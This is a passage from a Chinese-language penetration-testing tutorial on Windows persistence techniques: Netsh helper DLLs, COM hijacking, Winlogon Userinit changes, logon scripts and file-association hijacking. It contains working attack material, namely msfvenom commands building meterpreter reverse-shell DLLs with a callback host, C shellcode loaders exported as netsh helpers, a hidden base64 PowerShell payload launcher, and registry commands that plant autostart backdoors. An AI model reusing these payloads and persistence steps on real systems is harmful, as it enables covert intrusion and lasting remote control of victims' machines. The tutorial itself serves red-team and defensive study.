Spooler\u670d\u52a1\uff08SYSTEM\uff09\u76f8\u540c\u7ea7\u522b\u7684\u7279\u6743\uff0c\u5e76\u4e14\u5df2\u4eceSystem32\u6587\u4ef6\u5939\uff08\u5df2\u5220\u9664test.dll\u7684\u6587\u4ef6\u5939\uff09\u6267\u884c\u4e86\u6267\u884c\u3002"}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.img,{alt:"img",src:s(36674).A+"",width:"723",height:"239"})}),"\n",(0,r.jsx)(n.h3,{id:"netsh-helper-dll",children:"Netsh Helper DLL"}),"\n",(0,r.jsx)(n.p,{children:"Netsh\u662fWindows\u5b9e\u7528\u7a0b\u5e8f\uff0c\u7ba1\u7406\u5458\u53ef\u4ee5\u4f7f\u7528\u5b83\u6765\u6267\u884c\u4e0e\u7cfb\u7edf\u7684\u7f51\u7edc\u914d\u7f6e\u6709\u5173\u7684\u4efb\u52a1\uff0c\u5e76\u5728\u57fa\u4e8e\u4e3b\u673a\u7684Windows\u9632\u706b\u5899\u4e0a\u8fdb\u884c\u4fee\u6539\u3002\u53ef\u4ee5\u901a\u8fc7\u4f7f\u7528DLL\u6587\u4ef6\u6765\u6269\u5c55Netsh\u529f\u80fd\u3002\u6b64\u529f\u80fd\u4f7f\u7ea2\u961f\u53ef\u4ee5\u4f7f\u7528\u6b64\u5de5\u5177\u6765\u52a0\u8f7d\u4efb\u610fDLL\uff0c\u4ee5\u5b9e\u73b0\u4ee3\u7801\u6267\u884c\u5e76\u56e0\u6b64\u5b9e\u73b0\u6301\u4e45\u6027\u3002\u4f46\u662f\uff0c\u6b64\u6280\u672f\u7684\u5b9e\u73b0\u9700\u8981\u672c\u5730\u7ba1\u7406\u5458\u7ea7\u522b\u7684\u7279\u6743\u3002"}),"\n",(0,r.jsx)(n.p,{children:"\u751f\u6210\u6076\u610f\u7684DLL"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-bash",children:"msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.0.2.21 LPORT=4444 -f dll > /tmp/pentestlab.dll\n"})}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.img,{alt:"img",src:s(49738).A+"",width:"723",height:"222"})}),"\n",(0,r.jsx)(n.p,{children:"\u6dfb\u52a0\u52a9\u624bdll"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-powershell",children:"netsh\nadd helper path-to-malicious-dll\n"})}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.img,{alt:"img",src:s(72941).A+"",width:"605",height:"102"})}),"\n",(0,r.jsx)(n.p,{children:"\u6bcf\u6b21netsh\u5b9e\u7528\u7a0b\u5e8f\u542f\u52a8\u65f6\uff0c\u90fd\u4f1a\u6267\u884cDLL\uff0c\u5e76\u4e14\u5c06\u5efa\u7acb\u901a\u4fe1\u3002"}),"\n",(0,r.jsx)(n.p,{children:"\u4f46\u662f\uff0c\u9ed8\u8ba4\u60c5\u51b5\u4e0b\uff0cnetsh\u6ca1\u6709\u8ba1\u5212\u81ea\u52a8\u542f\u52a8\u3002\u521b\u5efa\u5c06\u5728Windows\u542f\u52a8\u671f\u95f4\u6267\u884c\u5b9e\u7528\u7a0b\u5e8f\u7684\u6ce8\u518c\u8868\u9879\u5c06\u5728\u4e3b\u673a\u4e0a\u521b\u5efa\u6301\u4e45\u6027\u3002\u8fd9\u53ef\u4ee5\u76f4\u63a5\u4eceMeterpreter\u4f1a\u8bdd\u6216Windows Shell\u4e2d\u5b8c\u6210\u3002"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-powershell",children:'reg add "HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v Pentestlab /t REG_SZ /d "C:\\Windows\\SysWOW64\\netsh"\nreg setval -k HKLM\\\\software\\\\microsoft\\\\windows\\\\currentversion\\\\run\\\\ -v pentestlab -d \'C:\\Windows\\SysWOW64\\netsh\'\n'})}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.img,{alt:"img",src:s(64786).A+"",width:"738",height:"282"})}),"\n",(0,r.jsxs)(n.p,{children:[(0,r.jsx)(n.a,{href:"https://pentestlab.blog/2019/10/01/persistence-registry-run-keys/",children:"\u6ce8\u518c\u8868\u8fd0\u884c\u952e\u7684"}),"\u66ff\u4ee3\u65b9\u6cd5\u662f\uff0c\u53ef\u4ee5\u4f7f\u7528\u591a\u79cd\u5176\u4ed6\u65b9\u6cd5\u6765\u542f\u52a8\u5b9e\u7528\u7a0b\u5e8f\uff0c\u4f8b\u5982\u521b\u5efa",(0,r.jsx)(n.a,{href:"https://pentestlab.blog/2019/10/07/persistence-new-service/",children:"\u670d\u52a1"}),"\u6216\u8ba1\u5212\u4efb\u52a1\u3002"]}),"\n",(0,r.jsx)(n.hr,{}),"\n",(0,r.jsxs)(n.p,{children:["\u4e00\u5bb6\u603b\u90e8\u4f4d\u4e8e\u8377\u5170\u7684IT\u5b89\u5168\u516c\u53f8\uff0c\u8be5\u516c\u53f8\u7387\u5148\u5728\u5176",(0,r.jsx)(n.a,{href:"https://github.com/outflanknl/NetshHelperBeacon",children:"Github"}),"\u5b58\u50a8\u5e93\u4e2d\u53d1\u5e03\u6982\u5ff5\u8bc1\u660eDLL \u3002DLL\u662f\u7531",(0,r.jsx)(n.a,{href:"https://twitter.com/MarcOverIP",children:"Marc Smeets"}),"\u7528C\u7f16\u5199\u7684\uff0c\u53ef\u4ee5\u5bf9\u5176\u8fdb\u884c\u4fee\u6539\u4ee5\u5305\u542b\u81ea\u5b9a\u4e49\u7684shellcode\u3002Metasploit Framework\u5b9e\u7528\u7a0b\u5e8f\u201c ",(0,r.jsx)(n.strong,{children:"msfvenom"})," \u201d\u53ef\u7528\u4e8e\u751f\u6210\u5404\u79cd\u8bed\u8a00\u7684shellcode\u3002"]}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-powershell",children:"msfvenom -a x64 --platform Windows -p windows/x64/meterpreter/reverse_tcp -b '\\x00' -f c\n"})}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.img,{alt:"C Shellcode \u2013 Netsh",src:s(85563).A+"",width:"921",height:"421"})}),"\n",(0,r.jsx)(n.p,{children:"\u53ef\u4ee5\u5c06\u751f\u6210\u7684shellcode\u6ce8\u5165\u5230Netsh Helper DLL\u4ee3\u7801\u4e2d\u3002"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-C++",children:'#include <stdio.h>\n#include <windows.h> // only required if you want to pop calc\n\n#ifdef _M_X64\nunsigned char buf[] = "\\x48\\x31\\xc9\\x48\\x81\\xe9\\xc0\\xff\\xff\\xff\\x48\\x8d\\x05\\xef\\xff\\xff\\xff\\x48\\xbb";\n#else\nunsigned char buf[] = "\\x48\\x31\\xc9\\x48\\x81\\xe9\\xc0\\xff\\xff\\xff\\x48\\x8d\\x05\\xef\\xff\\xff\\xff\\x48\\xbb";\n#endif\n\n// Start a separate thread so netsh remains useful.\nDWORD WINAPI ThreadFunction(LPVOID lpParameter)\n{\n    LPVOID newMemory;\n    HANDLE currentProcess;\n    SIZE_T bytesWritten;\n    BOOL didWeCopy = FALSE;\n    // Get the current process handle \n    currentProcess = GetCurrentProcess();\n    // Allocate memory with Read+Write+Execute permissions \n    newMemory = VirtualAllocEx(currentProcess, NULL, sizeof(buf), MEM_COMMIT, PAGE_EXECUTE_READWRITE);\n    if (newMemory == NULL)\n        return -1;\n    // Copy the shellcode into the memory we just created \n    didWeCopy = WriteProcessMemory(currentProcess, newMemory, (LPCVOID)&buf, sizeof(buf), &bytesWritten);\n    if (!didWeCopy)\n        return -2;\n    // Yay! Let\'s run our shellcode! \n    ((void(*)())newMemory)();\n    return 1;\n}\n\n// define the DLL handler \'InitHelpderDll\' as required by netsh.\n// See https://msdn.microsoft.com/en-us/library/windows/desktop/ms708327(v=vs.85).aspx\nextern "C" __declspec(dllexport) DWORD InitHelperDll(DWORD dwNetshVersion, PVOID pReserved)\n{\n    //make a thread handler, start the function as a thread, and close the handler \n    HANDLE threadHandle;\n    threadHandle = CreateThread(NULL, 0, ThreadFunction, NULL, 0, NULL);\n    CloseHandle(threadHandle);\n    // simple testing by starting calculator\n    system ("start calc");\n\n    // return NO_ERROR is required. Here we are doing it the nasty way\n    return 0;\n}\n'})}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.img,{alt:"Netsh\u5e2e\u52a9\u7a0b\u5e8fDLL",src:s(79778).A+"",width:"1024",height:"578"})}),"\n",(0,r.jsxs)(n.p,{children:["\u4e0e\u4e0a\u8ff0\u65b9\u6cd5\u7c7b\u4f3c\uff0c",(0,r.jsx)(n.a,{href:"https://github.com/rtcrowley",children:"rtcrowley"}),"\u5728\u4ed6\u7684",(0,r.jsx)(n.a,{href:"https://github.com/rtcrowley/Offensive-Netsh-Helper",children:"Github"}),"\u5b58\u50a8\u5e93\u4e2d\u53d1\u5e03\u4e86\u8be5\u65b9\u6cd5\u7684PowerShell\u7248\u672c\u3002\u4ee5\u4e0b\u4ee3\u7801\u53ef\u7528\u4e8e\u6267\u884cPowerShell Base64\u7f16\u7801\u7684\u6709\u6548\u8d1f\u8f7d\uff0c\u5e76\u652f\u6301\u4e24\u4e2a\u9009\u9879\u3002"]}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-C++",children:'#include <stdio.h>\n#include <windows.h>\n\nDWORD WINAPI YahSure(LPVOID lpParameter)\n{\n    //Option 1: Quick and simple. Opens 1 PS proc & briefly displays window. Set payload to b64 unicode.\n    system("start C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe -win hidden -nonI -nopro -enc \\\n                SQBmACgAJABQAFMAVgBlAHIAcwBJAE8AbgBUAEEAQgBsAGUALgBQAFMAVgBFAFIAcwBpAG8ATgAuACYAIAAkAFIAIAAkAGQAYQB0AGEAIAAoACQASQBWACsAJABLACkAKQB8AEkARQBYAA==");\n\n    //Option 2: Execute loaded b64 into a reg key value. Will spin up a few etra procs, but will not open an extra window.\n    //system("C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe -c \\\n            $x=((gp HKLM:SOFTWARE\\\\Microsoft\\\\Notepad debug).debug); \\\n                powershell -nopro -enc $x 2> nul");\n    return 1;\n\n}\n\n//Custom netsh helper format\nextern "C" __declspec(dllexport) DWORD InitHelperDll(DWORD dwNetshVersion, PVOID pReserved)\n{\n    HANDLE hand;\n    hand = CreateThread(NULL, 0, YahSure, NULL, 0, NULL);\n    CloseHandle(hand);\n\n    return NO_ERROR;\n}\n'})}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.img,{alt:"Netsh Helper DLL \u2013 PowerShell\u65b9\u6cd5",src:s(39819).A+"",width:"1024",height:"527"})}),"\n",(0,r.jsxs)(n.p,{children:["\u6267\u884c\u201c ",(0,r.jsx)(n.strong,{children:"netsh"})," \u201d\u5b9e\u7528\u7a0b\u5e8f\u5e76\u4f7f\u7528\u201c ",(0,r.jsx)(n.strong,{children:"add helper"})," \u201d\u547d\u4ee4\u52a0\u8f7d\u7cfb\u7edf\u4e2d\u7684\u4e24\u4e2aDLL\u90fd\u5c06\u6267\u884c\u96c6\u6210\u7684\u6709\u6548\u8d1f\u8f7d\u3002"]}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-powershell",children:"netsh\nadd helper C:\\Users\\pentestlab\\Desktop\\NetshHelperBeacon.dll\nadd helper C:\\Users\\pentestlab\\Desktop\\NetshPowerShell.dll\n"})}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.img,{alt:"img",src:s(97470).A+"",width:"1024",height:"320"})}),"\n",(0,r.jsxs)(n.p,{children:["\u5f53\u6267\u884c\u201c ",(0,r.jsx)(n.strong,{children:"\u6dfb\u52a0\u5e2e\u52a9\u7a0b\u5e8f"})," \u201d\u547d\u4ee4\u4ee5\u52a0\u8f7dDLL\u6587\u4ef6\u65f6\uff0c\u5c06\u5728\u4ee5\u4e0b\u4f4d\u7f6e\u521b\u5efa\u6ce8\u518c\u8868\u9879\u3002"]}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{children:"HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\NetSh\n"})}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.img,{alt:"Netsh\u6ce8\u518c\u8868\u9879",src:s(76316).A+"",width:"1024",height:"435"})}),"\n",(0,r.jsxs)(n.p,{children:["\u5e94\u8be5\u6ce8\u610f\u7684\u662f\uff0c\u67d0\u4e9b\u53ef\u80fd\u5b89\u88c5\u5728\u53d7\u611f\u67d3\u7cfb\u7edf\u4e0a\u7684VPN\u5ba2\u6237\u7aef\u53ef\u80fd\u4f1a\u81ea\u52a8\u201c ",(0,r.jsx)(n.strong,{children:"netsh"})," \u201d \u542f\u52a8\uff0c\u56e0\u6b64\u53ef\u80fd\u4e0d\u9700\u8981\u4f7f\u7528\u5176\u4ed6\u65b9\u6cd5\u8fdb\u884c\u6301\u4e45\u5316\u3002"]}),"\n",(0,r.jsx)(n.h2,{id:"com\u52ab\u6301",children:"COM\u52ab\u6301"}),"\n",(0,r.jsx)(n.h3,{id:"\u4ecb\u7ecd-1",children:"\u4ecb\u7ecd"}),"\n",(0,r.jsx)(n.p,{children:"\u5fae\u8f6f\u5728Windows 3.11\u4e2d\u5f15\u5165\u4e86(Component Object Model, COM)\uff0c\u4f5c\u4e3a\u4e00\u79cd\u5b9e\u73b0\u5bf9\u8c61\u7684\u65b9\u6cd5\uff0c\u8fd9\u4e9b\u5bf9\u8c61\u53ef\u4ee5\u88ab\u4e0d\u540c\u7684\u6846\u67b6(ActiveX, COM+\uff0c DCOM\u7b49)\u4f7f\u7528\uff0c\u5e76\u4e14\u5728\u4e0d\u540c\u7684Windows\u73af\u5883\u4e2d\u5141\u8bb8\u4e92\u64cd\u4f5c\u6027\uff0c\u8fdb\u7a0b\u95f4\u901a\u4fe1\u548c\u4ee3\u7801\u91cd\u7528\u3002COM\u5bf9\u8c61\u7684\u6ee5\u7528\u4f7f\u5b89\u9632\u56e2\u961f\u80fd\u591f\u4ee3\u8868\u53d7\u4fe1\u4efb\u7684\u8fdb\u7a0b\u6267\u884c\u4efb\u610f\u4ee3\u7801\u3002\u6267\u884cCOM\u52ab\u6301\u4e0d\u9700\u8981\u7ba1\u7406\u5458\u6743\u9650\uff0c\u56e0\u4e3aHKCU\u6ce8\u518c\u8868\u914d\u7f6e\u5355\u5143\u4e2d\u7684\u7c7b\u5728HKLM\u4e2d\u7684\u7c7b\u4e4b\u524d\u6267\u884c\u3002\u552f\u4e00\u5f71\u54cd\u9ad8\u5b8c\u6574\u6027\u8fdb\u7a0b(\u63d0\u5347)\u7684\u4f8b\u5916\u60c5\u51b5\u662f\uff0c\u4ec5\u4eceHKLM\u4f4d\u7f6e\u52a0\u8f7d\u5bf9\u8c61\uff0c\u4ee5\u9632\u6b62\u7279\u6743\u63d0\u5347\u3002"}),"\n",(0,r.jsx)(n.p,{children:"\u6709\u591a\u79cd\u65b9\u6cd5\u53ef\u4ee5\u6267\u884c\u4ee3\u7801\uff0c\u4f46\u6709\u51e0\u79cd\u60c5\u51b5\u4e0b\uff0cCOM\u5df2\u88ab\u7528\u4e8e\u6301\u4e45\u6027\u653b\u51fb\u4e2d\uff0c\u8fdb\u884c\u6a2a\u5411\u79fb\u52a8\u548c\u9632\u5fa1\u89c4\u907f\u3002\u6839\u636e\u6076\u610f\u4ee3\u7801\u6267\u884c\u7684\u65b9\u5f0f\uff0c\u5728COM\u52ab\u6301\u671f\u95f4\u4f1a\u4f7f\u7528\u5404\u79cd\u6ce8\u518c\u8868\u5b50\u9879\u3002\u5177\u4f53\u5982\u4e0b\u6240\u793a\uff1a"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{children:"InprocServer/InprocServer32\nLocalServer/LocalServer32\nTreatAs\nProgID\n"})}),"\n",(0,r.jsx)(n.p,{children:"\u4e0a\u8ff0\u5b50\u5bc6\u94a5\u4f4d\u4e8e\u4ee5\u4e0b\u6ce8\u518c\u8868\u7ec4\u4e2d:"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{children:"HKEY_CURRENT_USER\\Software\\Classes\\CLSID\nHKEY_LOCAL_MACHINE\\Software\\Classes\\CLSID\n"})}),"\n",(0,r.jsx)(n.p,{children:"\u53d1\u73b0COM\u5bc6\u94a5\uff0c\u4ee5\u8fdb\u884c\u52ab\u6301"}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.img,{alt:"image-20210707142345792",src:s(8594).A+"",width:"2578",height:"1500"})}),"\n",(0,r.jsx)(n.p,{children:"\u5e38\u89c1\u7684COM\u52ab\u6301\u624b\u6cd5\u6709\uff1a"}),"\n",(0,r.jsxs)(n.ol,{children:["\n",(0,r.jsx)(n.li,{children:(0,r.jsx)(n.strong,{children:"\u589e\u52a0\u7f3a\u5c11\u7684CLSID\u8fdb\u884c\u5229\u7528"})}),"\n",(0,r.jsx)(n.li,{children:(0,r.jsx)(n.strong,{children:"\u4fee\u6539\u539f\u6709CLSID\u52a0\u8f7d\u7684\u7a0b\u5e8f"})}),"\n",(0,r.jsx)(n.li,{children:(0,r.jsx)(n.strong,{children:"\u66ff\u6362\u6389CLSID\u4e0b\u52a0\u8f7d\u8def\u5f84\u7684\u7a0b\u5e8f"})}),"\n"]}),"\n",(0,r.jsxs)(n.p,{children:["\u7531David Tulis\u5f00\u53d1\u7684\u79f0\u4e3a",(0,r.jsx)(n.a,{href:"https://github.com/nccgroup/acCOMplice",children:"acCOMplice"}),"\u7684PowerShell\u811a\u672c\u53ef\u4ee5\u76f4\u63a5\u68c0\u7d22\u7cfb\u7edf\u4e0a\u5b58\u5728\u7684\u7f3a\u5c11\u7684\u5e93\u53ca\u5176CLSID"]}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.img,{alt:"image-20210707142120969",src:s(27717).A+"",width:"2798",height:"392"})}),"\n",(0,r.jsx)(n.h3,{id:"\u6301\u4e45\u5316",children:"\u6301\u4e45\u5316"}),"\n",(0,r.jsx)(n.h4,{id:"\u8ba1\u5212\u4efb\u52a1-1",children:"\u8ba1\u5212\u4efb\u52a1"}),"\n",(0,r.jsxs)(n.p,{children:[(0,r.jsx)(n.a,{href:"https://github.com/enigma0x3/Misc-PowerShell-Stuff/blob/master/Get-ScheduledTaskComHandler.ps1",children:(0,r.jsx)(n.code,{children:"Get-ScheduledTaskComHandler"})}),"\uff0c\u8be5\u811a\u672c\u53ef\u4ee5\u68c0\u67e5\u4e3b\u673a\u4e0a\u6240\u6709\u5728\u7528\u6237\u767b\u5f55\u65f6\u6267\u884c\u5e76\u4e14\u5bb9\u6613\u53d7\u5230COM\u52ab\u6301\u7684\u9884\u5b9a\u4efb\u52a1"]}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-powershell",children:"Import-Module .\\Get-ScheduledTaskComHandler.ps1\nGet-ScheduledTaskComHandler\n"})}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.img,{alt:"\u6301\u4e45\u6027COM\u52ab\u6301\u7684\u5b9e\u73b0",src:s(8749).A+"",width:"748",height:"372"})}),"\n",(0,r.jsx)(n.p,{children:"\u53c2\u6570\u201cPersistenceLocations\u201d\u5c06\u68c0\u7d22\u6613\u53d7COM\u52ab\u6301\u7684\u8ba1\u5212\u4efb\u52a1\uff0c\u8fd9\u4e9b\u4efb\u52a1\u53ef\u7528\u4e8e\u6301\u4e45\u6027\u4e14\u4e0d\u9700\u8981\u63d0\u5347\u7684\u7279\u6743\u3002 CLSID\u548c\u5173\u8054\u7684DLL\u4e5f\u5c06\u663e\u793a\u5728\u8f93\u51fa\u4e2d\u3002"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-powershell",children:"Get-ScheduledTaskComHandler -PersistenceLocations\n"})}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.img,{alt:"\u6301\u4e45\u6027COM\u52ab\u6301\u7684\u5b9e\u73b0",src:s(92733).A+"",width:"784",height:"458"})}),"\n",(0,r.jsxs)(n.p,{children:["\u4efb\u52a1\u201cCacheTask\u201d\u5728\u8c03\u7528\u65f6\u4f7f\u7528\u201cwininet.dll\u201d\u5e76\u5177\u6709\u4ee5\u4e0bCLSID\uff1a",(0,r.jsx)(n.code,{children:"{0358B920-0AC7-461F-98F4-58E32CD89148}"})]}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.img,{alt:"\u6301\u4e45\u6027COM\u52ab\u6301\u7684\u5b9e\u73b0",src:s(19546).A+"",width:"721",height:"486"})}),"\n",(0,r.jsx)(n.p,{children:"\u8c03\u7528\u201c schtasks\u201d\u5b9e\u7528\u7a0b\u5e8f\u83b7\u53d6\u5b58\u50a8\u4f4d\u7f6e"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-powershell",children:'schtasks /query /XML /TN "\\Microsoft\\Windows\\Wininet\\CacheTask"\n'})}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.img,{alt:"\u6301\u4e45\u6027COM\u52ab\u6301\u7684\u5b9e\u73b0",src:s(22460).A+"",width:"842",height:"532"})}),"\n",(0,r.jsx)(n.h3,{id:"\u53c2\u8003\u6587\u7ae0",children:"\u53c2\u8003\u6587\u7ae0"}),"\n",(0,r.jsxs)(n.ul,{children:["\n",(0,r.jsx)(n.li,{children:(0,r.jsx)(n.a,{href:"https://www.4hou.com/posts/Mo51",children:"\u6301\u4e45\u6027COM\u52ab\u6301\u7684\u5b9e\u73b0"})}),"\n",(0,r.jsx)(n.li,{children:(0,r.jsx)(n.a,{href:"https://pentestlab.blog/2020/05/20/persistence-com-hijacking/",children:"Persistence \u2013 COM Hijacking"})}),"\n",(0,r.jsx)(n.li,{children:(0,r.jsx)(n.a,{href:"https://422926799.github.io/posts/7dc498ec.html",children:"COM\u52ab\u6301\u5b66\u4e60"})}),"\n"]}),"\n",(0,r.jsx)(n.h2,{id:"winlogon\u7528\u6237\u767b\u5f55\u521d\u59cb\u5316",children:"Winlogon\u7528\u6237\u767b\u5f55\u521d\u59cb\u5316"}),"\n",(0,r.jsx)(n.p,{children:"winlogon.exe\u662fwindows\u4e2d\u975e\u5e38\u91cd\u8981\u7684\u8fdb\u7a0b,\u5728\u7528\u6237\u8fd8\u6ca1\u767b\u5f55\u7cfb\u7edf\u4e4b\u524d\u5c31\u5df2\u7ecf\u5b58\u5728,\u5e76\u4e0e\u5bc6\u7801\u9a8c\u8bc1\u76f8\u5173\u7684\u91cd\u8981\u4efb\u52a1\u7cbe\u5bc6\u76f8\u5173\u3002\u4f8b\u5982\uff0c\u5f53\u5728\u7528\u6237\u767b\u5f55\u65f6\uff0cWinlogon \u8fdb\u7a0b\u8d1f\u8d23\u5c06\u7528\u6237\u914d\u7f6e\u6587\u4ef6\u52a0\u8f7d\u5230\u6ce8\u518c\u8868\u4e2d"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{children:"HKLM\\Software\\Microsoft\\WindowsNT\\CurrentVersion\\Winlogon\\\nHKCU\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\\n"})}),"\n",(0,r.jsx)(n.p,{children:"\u5bf9\u8fd9\u4e9b\u6ce8\u518c\u8868\u9879\u7684\u6076\u610f\u4fee\u6539\u53ef\u80fd\u5bfc\u81f4 Winlogon \u52a0\u8f7d\u548c\u6267\u884c\u6076\u610f DLL \u6216\u53ef\u6267\u884c\u6587\u4ef6\u3002"}),"\n",(0,r.jsx)(n.p,{children:"\u547d\u4ee4\u884c\u4fee\u6539"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-powershell",children:'reg delete "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon" /v Userinit /f\nreg add "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon"  /v "Userinit" /t REG_SZ /d "C:\\Windows\\system32\\cmd.exe," /f\n'})}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.img,{alt:"\u56fe\u7247",src:s(68185).A+"",width:"1080",height:"611"})}),"\n",(0,r.jsx)(n.p,{children:"powershell\u4e00\u53e5\u8bdd\u4fee\u6539"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-powershell",children:'Set-ItemProperty   "HKLM:\\SOFTWARE\\Microsoft\\WINDOWS NT\\CurrentVersion\\Winlogon" -name Userinit -value "C:\\Windows\\system32\\userinit.exe,C:\\Windows\\system32\\cmd.exe"\n'})}),"\n",(0,r.jsx)(n.h2,{id:"logon-scripts\u540e\u95e8",children:"Logon Scripts\u540e\u95e8"}),"\n",(0,r.jsx)(n.p,{children:"Windows\u767b\u5f55\u811a\u672c\uff0c\u5f53\u7528\u6237\u767b\u5f55\u65f6\u89e6\u53d1\uff0cLogon Scripts\u80fd\u591f\u4f18\u5148\u4e8e\u6740\u6bd2\u8f6f\u4ef6\u6267\u884c\uff0c\u7ed5\u8fc7\u6740\u6bd2\u8f6f\u4ef6\u5bf9\u654f\u611f\u64cd\u4f5c\u7684\u62e6\u622a\u3002"}),"\n",(0,r.jsx)(n.p,{children:"\u6ce8\u518c\u8868\u4f4d\u7f6e:"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{children:"HKEY_CURRENT_USER\\Environment\n"})}),"\n",(0,r.jsx)(n.p,{children:"\u589e\u52a0\u952e\u503c\u5bf9"}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.img,{alt:"\u56fe\u7247",src:s(51300).A+"",width:"1079",height:"480"})}),"\n",(0,r.jsx)(n.h2,{id:"\u6587\u4ef6\u5173\u8054\u6253\u5f00\u65b9\u5f0f",children:"\u6587\u4ef6\u5173\u8054\uff08\u6253\u5f00\u65b9\u5f0f\uff09"}),"\n",(0,r.jsx)(n.p,{children:'\u6587\u4ef6\u5173\u8054\u5c31\u662f\u5c06\u4e00\u79cd\u7c7b\u578b\u7684\u6587\u4ef6\u4e0e\u4e00\u4e2a\u53ef\u4ee5\u6253\u5f00\u5b83\u7684\u7a0b\u5e8f\u5efa\u7acb\u8d77\u4e00\u79cd\u4f9d\u5b58\u5173\u7cfb\uff0c\u4e00\u4e2a\u6587\u4ef6\u53ef\u4ee5\u4e0e\u591a\u4e2a\u5e94\u7528\u7a0b\u5e8f\u53d1\u751f\u5173\u8054\u3002\u53ef\u4ee5\u5229\u7528\u6587\u4ef6\u7684"\u6253\u5f00\u65b9\u5f0f"\u8fdb\u884c\u5173\u8054\u9009\u62e9\u3002'}),"\n",(0,r.jsx)(n.p,{children:"\u6211\u4eec\u53ef\u4ee5\u7528assoc\u547d\u4ee4\u663e\u793a\u6216\u4fee\u6539\u6587\u4ef6\u6269\u5c55\u540d\u5173\u8054\uff0c\u6211\u4eec\u53ef\u4ee5\u770b\u4e00\u4e0b.txt\u6587\u4ef6\u7684\u5173\u8054\u3002"}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.img,{alt:"\u56fe\u7247",src:s(37412).A+"",width:"795",height:"370"})}),"\n",(0,r.jsx)(n.p,{children:"\u7528ftype\u547d\u4ee4\u663e\u793a\u6216\u4fee\u6539\u7528\u5728\u6587\u4ef6\u6269\u5c55\u540d\u5173\u8054\u4e2d\u7684\u6587\u4ef6\u7c7b\u578b\u3002"}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.img,{alt:"\u56fe\u7247",src:s(40859).A+"",width:"822",height:"149"})}),"\n",(0,r.jsxs)(n.p,{children:["\u4fee\u6539",(0,r.jsx)(n.code,{children:"\\HKEY_CLASS_ROOT\\txtfile\\shell\\open\\command"}),"\u7684\u9ed8\u8ba4\u503c\u4e3a\u6211\u4eec\u8981\u6267\u884c\u7684\u7a0b\u5e8f"]}),"\n",(0,r.jsx)(n.p,{children:"\u4fee\u6539\u6ce8\u518c\u8868\uff08\u7ba1\u7406\u5458\u6743\u9650\uff09"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-powershell",children:'reg add "HKCR\\txtfile\\shell\\open\\command" /ve /t REG_EXPAND_SZ /d "C:\\Windows\\system32\\cmd.exe %1" /f\n'})}),"\n",(0,r.jsx)(n.p,{children:"\u518d\u6253\u5f00txt\u6587\u4ef6\u6253\u5f00\u7684\u662fcmd"}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.img,{alt:"\u56fe\u7247",src:s(97875).A+"",width:"1080",height:"367"})}),"\n",(0,r.jsx)(n.h2,{id:"bitsadmin",children:"Bitsadmin"}),"\n",(0,r.jsxs)(n.p,{children:["Windows\u64cd\u4f5c\u7cfb\u7edf\u5305\u542b\u5404\u79cd\u5b9e\u7528\u7a0b\u5e8f\uff0c\u7cfb\u7edf\u7ba1\u7406\u5458\u53ef\u4ee5\u4f7f\u7528\u5b83\u4eec\u6765\u6267\u884c\u5404\u79cd\u4efb\u52a1\u3002\u8fd9\u4e9b\u5b9e\u7528\u7a0b\u5e8f\u4e4b\u4e00\u662f\u540e\u53f0\u667a\u80fd\u4f20\u8f93\u670d\u52a1\uff08BITS\uff09\uff0c\u5b83\u53ef\u4ee5\u4fc3\u8fdb\u6587\u4ef6\u5230Web\u670d\u52a1\u5668\uff08HTTP\uff09\u548c\u5171\u4eab\u6587\u4ef6\u5939\uff08SMB\uff09\u76